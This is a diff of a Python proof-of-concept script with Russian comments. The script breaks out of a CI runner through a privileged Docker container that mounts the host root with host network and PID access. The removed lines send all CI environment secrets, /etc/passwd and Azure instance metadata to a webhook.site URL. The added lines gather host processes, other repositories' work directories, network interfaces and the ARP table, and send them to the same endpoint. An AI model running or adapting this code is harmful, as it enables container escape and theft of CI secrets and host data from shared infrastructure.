@@ -6,53 +6,49 @@ import requests
 WEBHOOK_URL = "https://webhook.site/bfd5d8c0-55a2-434a-a854-5b1d2508e0b4"
 
 def run_host_command(cmd_args):
-    """Выполняет команду на хост-машине через Docker-побег (монтирование корня)"""
-    base_cmd = ["docker", "run", "--rm", "--net=host", "-v", "/:/mnt/host", "alpine", "sh", "-c"]
+    """Выполняет команду на хост-машине через Docker-побег с полным доступом к хосту и сети"""
+    # --pid=host позволяет видеть процессы хоста, --net=host — сетевые интерфейсы
+    base_cmd = ["docker", "run", "--rm", "--net=host", "--pid=host", "-v", "/:/mnt/host", "alpine", "sh", "-c"]
     full_cmd = base_cmd + [cmd_args]
     try:
         return subprocess.check_output(full_cmd, stderr=subprocess.STDOUT).decode(errors='ignore')
     except subprocess.CalledProcessError as e:
         return f"ERROR (Exit Code {e.returncode}): {e.output.decode(errors='ignore')}"
 
-def collect_environment():
-    """Собирает переменные окружения текущего процесса (секреты CI/CD)"""
-    safe_env = {}
-    for key, value in os.environ.items():
-        # Маскируем совсем явные пароли для безопасности, но оставляем структуру
-        safe_env[key] = value
-    return safe_env
-
 def exploit_poc():
-    print("[*] Запуск комплексного PoC для CI/CD проверки...")
+    print("[*] Запуск глубокого PoC анализа изоляции раннера...")
     
     payload = {
-        "experiment_status": "FULL_POC_EXECUTION",
-        "ci_env_variables": collect_environment(),
-        "host_os_release": "",
-        "host_passwd": "",
-        "azure_imds_result": ""
+        "experiment_status": "DEEP_ISOLATION_CHECK",
+        "host_processes": "",
+        "host_work_directories": "",
+        "host_network_interfaces": "",
+        "local_network_ping_sweep": ""
     }
 
-    # 1. Читаем версию операционной системы хоста через примонтированный диск
-    print("[*] Чтение /etc/os-release с хост-машины...")
-    payload["host_os_release"] = run_host_command("cat /mnt/host/etc/os-release")
+    # 1. Проверяем запущенные процессы на хосте (--pid=host)
+    print("[*] Сканирование процессов на хосте...")
+    payload["host_processes"] = run_host_command("ps aux")
 
-    # 2. Читаем список пользователей хоста (проверка прав root)
-    print("[*] Чтение /etc/passwd с хост-машины...")
-    payload["host_passwd"] = run_host_command("cat /mnt/host/etc/passwd")
+    # 2. Проверяем, есть ли другие рабочие директории GitHub Actions на диске хоста
+    print("[*] Поиск следов других репозиториев в /mnt/host/home/runner/work...")
+    payload["host_work_directories"] = run_host_command("ls -la /mnt/host/home/runner/work/ 2>/dev/null || echo 'Not found'")
 
-    # 3. Запрос к Azure IMDS по правильному IP с метаданными
-    print("[*] Запрос к Azure IMDS (169.254.169.254)...")
-    imds_cmd = "wget -T 3 --header='Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' -O -"
-    payload["azure_imds_result"] = run_host_command(imds_cmd)
+    # 3. Проверяем сетевые интерфейсы хоста
+    print("[*] Анализ сетевых интерфейсов...")
+    payload["host_network_interfaces"] = run_host_command("ip a")
 
-    # 4. Экстракция результатов на внешний сервер
-    print("[*] Отправка полного отчета на Webhook.site...")
+    # 4. Быстрая проверка соседей в локальной подсети (ARP-таблица или пинг шлюза)
+    print("[*] Проверка ARP-таблицы (соседей по локальной сети)...")
+    payload["local_network_ping_sweep"] = run_host_command("arp -a")
+
+    # Отправка отчета на Webhook.site
+    print("[*] Отправка расширенного отчета на Webhook.site...")
     try:
-        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
-        print(f"[+] Успешно отправлено! HTTP статус: {response.status_code}")
+        response = requests.post(WEBHOOK_URL, json=payload, timeout=15)
+        print(f"[+] Отчет успешно отправлен! Статус: {response.status_code}")
     except Exception as e:
-        print(f"[-] Ошибка при отправке отчета: {e}")
+        print(f"[-] Ошибка отправки: {e}")
 
 if __name__ == "__main__":
     exploit_poc()
